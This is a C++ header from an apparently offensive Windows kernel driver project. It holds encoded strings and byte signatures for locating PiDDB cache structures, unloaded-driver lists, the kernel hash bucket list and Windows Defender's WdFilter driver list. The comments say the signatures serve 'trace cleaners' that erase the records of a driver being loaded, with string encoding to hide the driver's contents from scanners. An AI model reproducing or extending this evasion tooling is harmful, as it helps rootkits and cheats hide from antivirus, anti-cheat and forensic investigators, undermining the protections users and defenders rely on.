#pragma once

// Every string the driver uses at runtime, stored encoded so the plain text does not appear in Driver.sys.
// Decode each one where it is used, for example: EnumerateEProcess(Decode(NtoskrnlName).data())
//
// Include this after Crypt.cpp and Scan.cpp, which provide Encode/Decode/EncodeBytes and PatternToBytes.
// Debug messages (print(...)) are not listed here: print() compiles to nothing in release builds.

// Names searched for at runtime
constexpr auto NtoskrnlName = Encode("ntoskrnl.exe");
constexpr auto PageSectionName = Encode("PAGE");

// Trace-cleaning search targets
constexpr auto TextSectionName = Encode(".text");
constexpr auto CiDllName = Encode(L"ci.dll");
constexpr auto WdFilterName = Encode(L"WdFilter.sys");

// Exported routine/symbol names the trace cleaners resolve by hand through the export directory
// (no import table entries; data exports come back as the variable's address)
constexpr auto ExAcquireResourceName = Encode("ExAcquireResourceExclusiveLite");
constexpr auto ExReleaseResourceName = Encode("ExReleaseResourceLite");
constexpr auto ExFreePoolName = Encode("ExFreePool");
constexpr auto RtlDeleteElementGenericTableAvlName = Encode("RtlDeleteElementGenericTableAvl");

// Byte signatures that reach the trace globals from the reference 64KernelDriverCleaner (wildcard ?).
// Stored encoded like every other string; used via Decode(...).data() as a SignatureScan byte string

// The PiDDB housekeeping list head (nt!PiDDBCacheList), through the block in nt!PiLookupInDDBCache
// that threads a fresh entry onto the list tail: `lea rdx,[head] / mov rcx,[head->Blink] / cmp
// [rcx],rdx` — the Rtl InsertTailList shape. Unique in the whole image (verified against the live
// 19041 kernel) and located in PAGE, which ScanModuleImage searches first
constexpr auto PiDDBCacheListSignature = EncodeBytes(PatternToBytes(
    "48 8D 15 ? ? ? ? 48 8B 0D ? ? ? ? 48 39 11"));

// The AVL table itself (nt!PiDDBCacheTable), from the lookup block in nt!PiLookupInDDBCache:
// `lea rcx,[table] / xor r14d,r14d / mov [rsp+50h],rax`. The rip-relative lea starts at the match.
// Verified against the live 19041 image: resolves to the table whose root is its +0x10 right-child field
constexpr auto PiDDBCacheTableSignature = EncodeBytes(PatternToBytes(
    "48 8D 0D ? ? ? ? 45 33 F6 48 89 44 24 50"));

// nt!PiDDBLock, the ERESOURCE held across PiDDB list/table changes. The pattern starts at the
// `mov rax, gs:[188h]` prologue in nt!PpCheckInDriverDatabase; the `lea rcx,[PiDDBLock]` is at
// match+18 (`B2 01 48 8D 0D`), followed by the call to ExAcquireResourceExclusiveLite. Verified
// against the live 19041 image; the lea resolves to the global the PiDDB lookup takes exclusive
constexpr auto PiDDBLockSignature = EncodeBytes(PatternToBytes(
    "65 48 8B 04 25 88 01 00 00 66 FF 88 E4 01 00 00 B2 01 48 8D 0D ? ? ? ? E8 ? ? ? ? 4C 8B 8C 24 88 00 00 00 48 8D 4C 24 30 48 8B D6"));

constexpr auto MmUnloadedDriversSignature = EncodeBytes(PatternToBytes("4C 8B 15 ? ? ? ? 4C 8B C9"));
constexpr auto MmLastUnloadedDriverSignature = EncodeBytes(PatternToBytes("8B 05 ? ? ? ? 83 F8 32"));
constexpr auto KernelHashBucketListSignature21H1 = EncodeBytes(PatternToBytes(
    "4C 8D 35 ? ? ? ? E9 ? ? ? ? 8B 84 24"));
constexpr auto KernelHashBucketListSignature22H2 = EncodeBytes(PatternToBytes(
    "48 8B 1D ? ? ? ? EB ? F7 43 40 ? 20 ? ?"));

// WdFilter!MpBmDocOpenRules' runtime driver list. Defender's blocklist engine threads every kernel
// image it has seen onto its own list and keeps a pointer array beside it; none of that lives in the
// CI structures the cleaners above reach. The list reference is the rip-relative `lea` at the match
// (head is 8 bytes before its target), the count is the `inc dword ptr [rip+disp]` in the same
// routine, and the array pointer global sits 8 bytes past the count. Layout verified on 19041
constexpr auto WdFilterRuntimeDriversListSignature = EncodeBytes(PatternToBytes(
    "48 8B 0D ? ? ? ? FF 05"));
constexpr auto WdFilterRuntimeDriversCountSignature = EncodeBytes(PatternToBytes(
    "FF 05 ? ? ? ? 48 39 11"));

// MpFreeDriverInfoEx, the routine that releases one record's DriverInfo block. Two instruction shapes
// exist across builds: the call follows `mov [r8+8], rdx` (+3) on older ones and `mov [rdx+8], rcx`
// after a `mov rcx, r8` (+6) on newer ones. The call opcode is at match+3 and match+6 respectively
constexpr auto WdFilterFreeDriverInfoSignature = EncodeBytes(PatternToBytes(
    "89 ? 08 E8 ? ? ? ? ? ? ? ? ? ? ? E9"));
constexpr auto WdFilterFreeDriverInfoSignatureAlt = EncodeBytes(PatternToBytes(
    "89 ? 08 ? ? ? E8 ? ? ? ? ? ? ? ? ? ? ? E9"));

// 'mov rdx, imm64; shl rdx, 19h' inside MmGetVirtualForPhysical, where the imm64 IS PTE_BASE (GetPteBase
// reads it at match + 2). The bytes at match + 10..13 are the shl opcode and its displacement byte 0x19
constexpr auto PteBaseSignature = EncodeBytes(PatternToBytes("48 BA ? ? ? ? ? ? ? ? 48 C1 E2"));

// 'mov rax, imm64; mov rax, [rax+rdx*8]; shl rax, 19h' inside MmGetVirtualForPhysical. The imm64 is the PfnDatabase
// PteAddress column (GetPfnPteAddressBase reads it at match + 2); the shl displacement sits at match + 17
constexpr auto PfnPteAddressSignature = EncodeBytes(PatternToBytes("48 B8 ? ? ? ? ? ? ? ? 48 8B 04 D0 48 C1 E0 19"));
